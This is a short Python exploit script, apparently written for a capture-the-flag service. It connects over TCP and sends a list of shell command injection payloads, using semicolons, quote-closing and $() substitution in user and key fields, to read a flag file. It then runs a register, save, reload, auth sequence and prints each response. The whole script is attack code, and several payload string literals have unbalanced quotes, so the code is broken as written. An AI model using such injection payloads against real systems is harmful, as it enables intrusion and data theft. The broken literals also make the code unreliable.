import os, socket, time, re, sys
ip = os.environ.get("IP"); port = int(os.environ.get("PORT"))
if not ip or not port:
  print("Falta IP/PORT", file=sys.stderr); sys.exit(2)

def recv_all(s, t=0.6):
  s.settimeout(t)
  buf = bytearray()
  try:
    while True:
      d = s.recv(4096)
      if not d: break
      buf.extend(d)
      if len(d) < 4096: break
  except Exception:
    pass
  return bytes(buf)

def send(s, line):
  if not line.endswith("\n"): line += "\n"
  s.sendall(line.encode()); time.sleep(0.2)
  return recv_all(s)

payloads = [
  ("user_inj_semicolon",      "REKE ";cat /home/ctf/flag.txt;#":x"),
  ("key_inj_semicolon",       "REKE u:";cat /home/ctf/flag.txt;#"),
  ("user_inj_dquote_close",   "REKE \";cat /home/ctf/flag.txt;# :x"),
  ("key_inj_dquote_close",    "REKE u:\";cat /home/ctf/flag.txt;#"),
  ("user_inj_dollar_subst",   "REKE $(cat /home/ctf/flag.txt):x"),
  ("key_inj_dollar_subst",    "REKE u:$(cat /home/ctf/flag.txt)"),
]

with socket.create_connection((ip, port), timeout=5) as s:
  _ = recv_all(s, 0.3)
  for name, cmd in payloads:
    try:
      r1 = send(s, cmd)
      rid = 1
      m = re.search(rb"Registered: ID->(\d+)", r1)
      if m: rid = int(m.group(1))
      send(s, f"SAVE {rid}")
      send(s, "RLDB")
      send(s, f"AUTH {rid}")
      page = send(s, "GTPR").decode(errors="ignore")
      print("===", name, "===")
      print(page[:500])
    except Exception as e:
      print("===", name, "ERROR ===", e)
